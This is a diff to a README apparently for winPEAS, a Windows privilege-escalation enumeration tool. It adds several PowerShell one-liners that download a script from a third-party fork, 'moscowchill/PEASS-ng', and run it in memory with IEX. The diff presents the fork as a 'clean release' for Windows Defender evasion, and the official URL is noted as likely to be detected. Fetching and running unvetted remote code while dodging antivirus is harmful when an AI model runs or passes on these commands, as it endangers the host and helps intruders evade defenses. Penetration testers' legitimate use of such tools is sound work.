@@ -16,7 +16,20 @@ Download the **[latest releas from here](https://github.com/peass-ng/PEASS-ng/re
 
 ```bash
 # Get latest clean release (Windows Defender evasion)
-powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/moscowchill/PEASS-ng/main/winPEAS/winPEASps1/winPEAS.ps1')"
+$url = "https://raw.githubusercontent.com/moscowchill/PEASS-ng/main/winPEAS/winPEASps1/winPEAS.ps1"
+
+# Run and display output only
+powershell "IEX(New-Object Net.WebClient).downloadString('$url')"
+
+# Run and save output to file
+powershell "IEX(New-Object Net.WebClient).downloadString('$url') | Tee-Object -FilePath winpeas_output.txt"
+
+# Run and save output while displaying in real-time
+powershell "IEX(New-Object Net.WebClient).downloadString('$url') *>&1 | Tee-Object -FilePath winpeas_output.txt"
+
+# Download script, run, and save output (for later reading without re-running)
+Invoke-WebRequest -Uri "$url" -OutFile winPEAS.ps1
+.\winPEAS.ps1 | Tee-Object -FilePath winpeas_output.txt
 
 # Original version (may be detected)
 powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
